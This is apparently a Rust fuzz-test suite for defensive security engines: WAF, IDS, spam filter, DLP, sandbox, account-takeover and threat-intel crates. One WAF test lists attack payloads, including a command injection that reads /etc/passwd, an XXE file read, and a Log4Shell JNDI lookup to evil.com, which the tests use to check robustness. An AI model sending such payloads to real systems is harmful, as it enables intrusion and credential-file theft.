//! Fuzz / property-based tests for security crates.
//!
//! Guarantees:no panics on arbitrary input, no infinite loops (bounded by iteration count),
//! deterministic scoring properties, and basic invariant checking.

use fuzz_tests::*;
use rand::Rng;
use std::net::{IpAddr, Ipv4Addr};

// ===========================================================================
// WAF Engine — No-panic + invariant tests
// ===========================================================================

mod waf_fuzz {
    use super::*;
    use waf_engine::{
        config::WafConfig,
        engine::{HttpRequest, WafEngine},
    };

    fn make_engine() -> WafEngine {
        WafEngine::new(WafConfig::default())
    }

    #[test]
    fn fuzz_waf_inspect_random_paths() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let path_len = rng.gen_range(0..500);
            let path = random_ascii(path_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: &path,
                query_string: None,
                headers: &[],
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_queries() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let qs_len = rng.gen_range(0..300);
            let qs = random_ascii(qs_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: "/api/test",
                query_string: Some(&qs),
                headers: &[],
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_bodies() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..3_000 {
            let body_len = rng.gen_range(0..1_000);
            let body = random_ascii(body_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "POST",
                path: "/api/data",
                query_string: None,
                headers: &[("content-type".into(), "application/json".into())],
                body: Some(&body),
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_headers() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..3_000 {
            let num_headers = rng.gen_range(0..20);
            let headers: Vec<(String, String)> = (0..num_headers)
                .map(|_| {
                    let name_len = rng.gen_range(1..30);
                    let val_len = rng.gen_range(0..200);
                    (random_ascii(name_len), random_ascii(val_len))
                })
                .collect();
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)),
                method: "GET",
                path: "/",
                query_string: None,
                headers: &headers,
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_unicode() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let path = random_unicode(rng.gen_range(0..200));
            let qs = random_unicode(rng.gen_range(0..200));
            let body = random_unicode(rng.gen_range(0..500));
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "POST",
                path: &path,
                query_string: Some(&qs),
                headers: &[],
                body: Some(&body),
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_known_attack_strings_no_panic() {
        let engine = make_engine();
        let large_string = "a".repeat(100_000);
        let attacks = vec![
            "' OR 1=1 --",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; cat /etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/x}",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "O:4:\"Test\":0:{}",
            "\x00\x01\x02\x03\x04\x05\x7e\x7f",
            large_string.as_str(),
        ];

        for attack in attacks {
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: attack,
                query_string: Some(attack),
                headers: &[("x-forwarded-for".into(), attack.into())],
                body: Some(attack),
            };
            let _ = engine.inspect(&req);
        }
    }
}

// ===========================================================================
// IDS Engine — No-panic on arbitrary payloads
// ===========================================================================

mod ids_fuzz {
    use super::*;
    use ids_engine::{config::IdsConfig, engine::IdsEngine};

    fn make_engine() -> IdsEngine {
        IdsEngine::new(IdsConfig::default()).expect("default IDS config should not fail")
    }

    #[test]
    fn fuzz_ids_inspect_random_payloads() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let payload_len = rng.gen_range(0..2_000);
            let payload = random_bytes(payload_len);
            let (verdict, alerts) = engine.inspect(
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                rng.gen_range(1..65535),
                "tcp",
                &payload,
            );
            // Alert list invariant:all alerts must have non-empty message
            for alert in &alerts {
                assert!(alert.id > 0, "Alert must have a valid ID");
            }
            let _ = verdict;
        }
    }

    #[test]
    fn fuzz_ids_inspect_protocol_strings() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        let protocols = [
            "tcp", "udp", "smtp", "dns", "tls", "http", "", "UNKNOWN", "💀",
        ];
        for _ in 0..3_000 {
            let protocol = protocols[rng.gen_range(0..protocols.len())];
            let payload_len = rng.gen_range(0..500);
            let payload = random_bytes(payload_len);
            let _ = engine.inspect(
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                25,
                protocol,
                &payload,
            );
        }
    }

    #[test]
    fn fuzz_ids_large_payload_no_hang() {
        let engine = make_engine();
        // 1MB payload should complete without hanging or panicking
        let large = vec![0x41u8; 1_024 * 1_024];
        let _ = engine.inspect(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)), 80, "tcp", &large);
    }

    #[test]
    fn fuzz_ids_binary_payloads() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        // All possible byte values
        for _ in 0..1_000 {
            let len = rng.gen_range(1..200);
            let payload: Vec<u8> = (0..len).map(|_| rng.gen::<u8>()).collect();
            let _ = engine.inspect(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)), 443, "tls", &payload);
        }
    }
}

// ===========================================================================
// Spam Filter — No-panic + scoring invariants
// ===========================================================================

mod spam_fuzz {
    use super::*;
    use spam_filter::engine::SpamEngine;

    #[test]
    fn fuzz_spam_analyze_random_bodies() {
        let engine = SpamEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..3_000 {
            let body_len = rng.gen_range(0..2_000);
            let body = random_ascii(body_len);
            let headers: Vec<(String, String)> = vec![];
            let verdict = engine.analyze(&body, &headers, None);
            // Score should always be finite
            assert!(verdict.score.is_finite(), "Spam score must be finite");
        }
    }

    #[test]
    fn fuzz_spam_analyze_with_headers() {
        let engine = SpamEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let body = random_ascii(rng.gen_range(0..500));
            let num_headers = rng.gen_range(0..15);
            let headers: Vec<(String, String)> = (0..num_headers)
                .map(|_| {
                    (
                        random_ascii(rng.gen_range(1..30)),
                        random_ascii(rng.gen_range(0..200)),
                    )
                })
                .collect();
            let auth = if rng.gen_bool(0.5) {
                Some(random_ascii(rng.gen_range(0..100)))
            } else {
                None
            };
            let verdict = engine.analyze(&body, &headers, auth.as_deref());
            assert!(verdict.score.is_finite());
        }
    }

    #[test]
    fn fuzz_spam_unicode_bodies() {
        let engine = SpamEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let body = random_unicode(rng.gen_range(0..1_000));
            let verdict = engine.analyze(&body, &[], None);
            assert!(verdict.score.is_finite());
        }
    }

    #[test]
    fn fuzz_spam_training_no_panic() {
        let engine = SpamEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..1_000 {
            let text_len = rng.gen_range(0..500);
            let text = random_ascii(text_len);
            if rng.gen_bool(0.5) {
                engine.train_spam(&text);
            } else {
                engine.train_ham(&text);
            }
        }
    }

    #[test]
    fn fuzz_spam_empty_input() {
        let engine = SpamEngine::new();
        let verdict = engine.analyze("", &[], None);
        assert!(verdict.score.is_finite());
    }
}

// ===========================================================================
// DLP Engine — No-panic + PII detection invariants
// ===========================================================================

mod dlp_fuzz {
    use super::*;
    use dlp_engine::engine::DlpEngine;

    #[test]
    fn fuzz_dlp_scan_random_text() {
        let engine = DlpEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let body_len = rng.gen_range(0..1_000);
            let body = random_ascii(body_len);
            let verdict = engine.scan(&body, None);
            // Findings must be non-negative
            assert!(
                verdict.pii_findings.len() < 10_000,
                "Shouldn't produce unreasonable findings"
            );
        }
    }

    #[test]
    fn fuzz_dlp_scan_with_domains() {
        let engine = DlpEngine::new();
        let mut rng = rand::thread_rng();
        let domains = ["example.com", "internal.corp", "gov.us", "partner.io"];

        for _ in 0..2_000 {
            let body = random_ascii(rng.gen_range(0..500));
            let domain = domains[rng.gen_range(0..domains.len())];
            let _ = engine.scan(&body, Some(domain));
        }
    }

    #[test]
    fn fuzz_dlp_known_patterns_no_panic() {
        let engine = DlpEngine::new();

        // Strings that mimic PII patterns
        let test_strings = [
            "My SSN is 123-45-6789",
            "Credit card: 4111-1111-1111-1111",
            "Call me at (555) 123-4567",
            "Email: test@example.com",
            "AKIAIOSFODNN7EXAMPLE",                 // AWS key-like
            "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", // GitHub token-like
            &"a]".repeat(10_000),                   // Pathological regex input
            &"\x00".repeat(100),                    // Null bytes
        ];

        for s in &test_strings {
            let _ = engine.scan(s, None);
        }
    }

    #[test]
    fn fuzz_dlp_unicode() {
        let engine = DlpEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let body = random_unicode(rng.gen_range(0..500));
            let _ = engine.scan(&body, None);
        }
    }
}

// ===========================================================================
// Sandbox Engine — No-panic on arbitrary bytes
// ===========================================================================

mod sandbox_fuzz {
    use super::*;
    use sandbox::engine::SandboxEngine;

    #[test]
    fn fuzz_sandbox_analyze_random_bytes() {
        let engine = SandboxEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..3_000 {
            let data_len = rng.gen_range(0..5_000);
            let data = random_bytes(data_len);
            let filename = if rng.gen_bool(0.5) {
                Some(format!(
                    "file_{}.{}",
                    random_string(5),
                    random_extension(&mut rng)
                ))
            } else {
                None
            };
            let _ = engine.analyze(&data, filename.as_deref());
        }
    }

    #[test]
    fn fuzz_sandbox_dangerous_extensions() {
        let engine = SandboxEngine::new();

        let extensions = [
            "exe", "dll", "bat", "cmd", "ps1", "vbs", "js", "hta", "scr", "pif", "com", "msi",
            "jar", "py", "sh", "elf",
        ];
        for ext in &extensions {
            let data = random_bytes(500);
            let filename = format!("test.{}", ext);
            let result = engine.analyze(&data, Some(&filename));
            // Should not panic — may reject or quarantine
            let _ = result;
        }
    }

    #[test]
    fn fuzz_sandbox_zip_magic_bytes() {
        let engine = SandboxEngine::new();

        // ZIP magic header followed by random data
        let mut data = vec![0x50, 0x4B, 0x03, 0x04];
        let mut rng = rand::thread_rng();
        for _ in 0..500 {
            data.push(rng.gen::<u8>());
        }
        let _ = engine.analyze(&data, Some("archive.zip"));

        // PE magic
        let mut pe_data = vec![0x4D, 0x5A];
        for _ in 0..500 {
            pe_data.push(rng.gen::<u8>());
        }
        let _ = engine.analyze(&pe_data, Some("program.exe"));

        // PDF magic
        let mut pdf_data = b"%PDF-1.4\n".to_vec();
        for _ in 0..500 {
            pdf_data.push(rng.gen::<u8>());
        }
        let _ = engine.analyze(&pdf_data, Some("document.pdf"));
    }

    #[test]
    fn fuzz_sandbox_empty_and_large() {
        let engine = SandboxEngine::new();

        // Empty
        let _ = engine.analyze(&[], None);
        let _ = engine.analyze(&[], Some("empty.txt"));

        // Moderately large (100KB)
        let large = vec![0x41u8; 100 * 1024];
        let _ = engine.analyze(&large, Some("large.bin"));
    }

    fn random_extension(rng: &mut impl Rng) -> String {
        let exts = [
            "txt", "doc", "pdf", "exe", "zip", "png", "html", "js", "py", "csv",
        ];
        exts[rng.gen_range(0..exts.len())].into()
    }
}

// ===========================================================================
// ATO Protection — No-panic + risk score invariants
// ===========================================================================

mod ato_fuzz {
    use super::*;
    use ato_protection::{config::AtoConfig, engine::AtoEngine, session::LoginEvent};
    use chrono::Utc;

    fn make_engine() -> AtoEngine {
        AtoEngine::with_config(AtoConfig::default())
    }

    #[test]
    fn fuzz_ato_evaluate_random_logins() {
        let engine = make_engine();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let event = LoginEvent {
                user_id: random_string(rng.gen_range(1..50)),
                ip_address: format!(
                    "{}.{}.{}.{}",
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256)
                ),
                user_agent: random_ascii(rng.gen_range(0..200)),
                latitude: if rng.gen_bool(0.7) {
                    Some(rng.gen_range(-90.0..90.0))
                } else {
                    None
                },
                longitude: if rng.gen_bool(0.7) {
                    Some(rng.gen_range(-180.0..180.0))
                } else {
                    None
                },
                timestamp: Utc::now(),
                success: rng.gen_bool(0.5),
                tls_fingerprint: None, // Skip TLS fingerprint in fuzz tests
            };
            let verdict = engine.evaluate(&event);
            assert!(verdict.risk_score.is_finite(), "Risk score must be finite");
            assert!(verdict.risk_score >= 0.0, "Risk score must be >= 0");
        }
    }

    #[test]
    fn fuzz_ato_garbage_ips() {
        let engine = make_engine();

        let garbage_ips = [
            "",
            "not-an-ip",
            "999.999.999.999",
            "::1",
            "fe80::1%eth0",
            "0.0.0.0",
            "255.255.255.255",
            "10.0.0.😀",
        ];

        for ip in &garbage_ips {
            let event = LoginEvent {
                user_id: "test_user".into(),
                ip_address: ip.to_string(),
                user_agent: "test-agent".into(),
                latitude: None,
                longitude: None,
                timestamp: Utc::now(),
                success: true,
                tls_fingerprint: None,
            };
            // Must not panic
            let _ = engine.evaluate(&event);
        }
    }
}

// ===========================================================================
// Threat Intel — No-panic on garbage IPs and domains
// ===========================================================================

mod threat_intel_fuzz {
    use super::*;
    use threat_intel::ThreatIntelEngine;

    #[test]
    fn fuzz_threat_intel_check_random_ips() {
        let engine = ThreatIntelEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let ip = if rng.gen_bool(0.5) {
                // Valid-shaped IP
                format!(
                    "{}.{}.{}.{}",
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256)
                )
            } else {
                // Garbage
                random_ascii(rng.gen_range(0..50))
            };
            let _ = engine.check_ip(&ip);
        }
    }

    #[test]
    fn fuzz_threat_intel_check_random_domains() {
        let engine = ThreatIntelEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let domain = if rng.gen_bool(0.5) {
                format!(
                    "{}.{}.com",
                    random_string(rng.gen_range(1..20)),
                    random_string(rng.gen_range(1..10))
                )
            } else {
                random_unicode(rng.gen_range(0..50))
            };
            let _ = engine.check_domain(&domain);
        }
    }

    #[test]
    fn fuzz_threat_intel_combined_check() {
        let engine = ThreatIntelEngine::new();
        let mut rng = rand::thread_rng();

        for _ in 0..3_000 {
            let ip = if rng.gen_bool(0.7) {
                Some(format!(
                    "{}.{}.{}.{}",
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256),
                    rng.gen_range(0..256)
                ))
            } else {
                None
            };
            let domain = if rng.gen_bool(0.7) {
                Some(format!(
                    "{}.example.com",
                    random_string(rng.gen_range(1..20))
                ))
            } else {
                None
            };
            let _ = engine.check(ip.as_deref(), domain.as_deref());
        }
    }
}

// ===========================================================================
// STIX/TAXII parsing fuzz
// ===========================================================================

mod stix_fuzz {
    use super::*;
    use threat_intel::stix_taxii::{extract_indicators, StixBundle};

    #[test]
    fn fuzz_stix_extract_indicators_random() {
        let mut rng = rand::thread_rng();

        for _ in 0..5_000 {
            let pattern = random_ascii(rng.gen_range(0..500));
            let _ = extract_indicators(&pattern);
        }
    }

    #[test]
    fn fuzz_stix_extract_indicators_unicode() {
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let pattern = random_unicode(rng.gen_range(0..300));
            let _ = extract_indicators(&pattern);
        }
    }

    #[test]
    fn fuzz_stix_bundle_parse_random_json() {
        let mut rng = rand::thread_rng();

        for _ in 0..2_000 {
            let json = random_ascii(rng.gen_range(0..500));
            let _ = serde_json::from_str::<StixBundle>(&json);
        }
    }

    #[test]
    fn fuzz_stix_bundle_parse_almost_valid() {
        // JSON objects that are almost valid STIX bundles
        let almost_valid = [
            r#"{"type":"bundle","id":"bundle --1","objects":[]}"#,
            r#"{"type":"bundle","id":"","objects":[{"type":"indicator","id":"ind --1"}]}"#,
            r#"{"type":"bundle","id":"x","objects":[{"type":"unknown","id":"u --1"}]}"#,
            r#"{"type":"bundle","id":"x"}"#,
            r#"{}"#,
            r#"[]"#,
            r#"null"#,
        ];

        for json in &almost_valid {
            let _ = serde_json::from_str::<StixBundle>(json);
        }
    }
}

// ===========================================================================
// Cross-crate:Combined security pipeline fuzz
// ===========================================================================

mod combined_fuzz {
    use super::*;
    use dlp_engine::engine::DlpEngine;
    use sandbox::engine::SandboxEngine;
    use spam_filter::engine::SpamEngine;
    use threat_intel::ThreatIntelEngine;
    use waf_engine::{
        config::WafConfig,
        engine::{HttpRequest, WafEngine},
    };

    #[test]
    fn fuzz_email_delivery_pipeline() {
        // Simulate the security checks an email goes through:// 1. WAF inspect the API call
        // 2. Threat-intel check sender IP/domain
        // 3. Spam filter on body
        // 4. DLP scan on body
        // 5. Sandbox analyze attachment

        let waf = WafEngine::new(WafConfig::default());
        let ti = ThreatIntelEngine::new();
        let spam = SpamEngine::new();
        let dlp = DlpEngine::new();
        let sandbox_eng = SandboxEngine::new();

        let mut rng = rand::thread_rng();

        for _ in 0..1_000 {
            // 1. WAF
            let body = random_ascii(rng.gen_range(10..500));
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(
                    rng.gen_range(1..255),
                    rng.gen_range(0..255),
                    rng.gen_range(0..255),
                    rng.gen_range(1..255),
                )),
                method: "POST",
                path: "/v1/messages",
                query_string: None,
                headers: &[("content-type".into(), "application/json".into())],
                body: Some(&body),
            };
            let _ = waf.inspect(&req);

            // 2. Threat-intel
            let sender_ip = format!(
                "{}.{}.{}.{}",
                rng.gen_range(1..255),
                rng.gen_range(0..255),
                rng.gen_range(0..255),
                rng.gen_range(1..255)
            );
            let _ = ti.check_ip(&sender_ip);

            // 3. Spam
            let email_body = random_ascii(rng.gen_range(50..500));
            let _ = spam.analyze(&email_body, &[], None);

            // 4. DLP
            let _ = dlp.scan(&email_body, Some("recipient.com"));

            // 5. Sandbox
            let attachment = random_bytes(rng.gen_range(0..1_000));
            let _ = sandbox_eng.analyze(&attachment, Some("attachment.pdf"));
        }
    }
}

// ===========================================================================
// Helper:random_bytes (not in main fuzz_tests lib)
// ===========================================================================

fn random_bytes(len: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    (0..len).map(|_| rng.gen::<u8>()).collect()
}
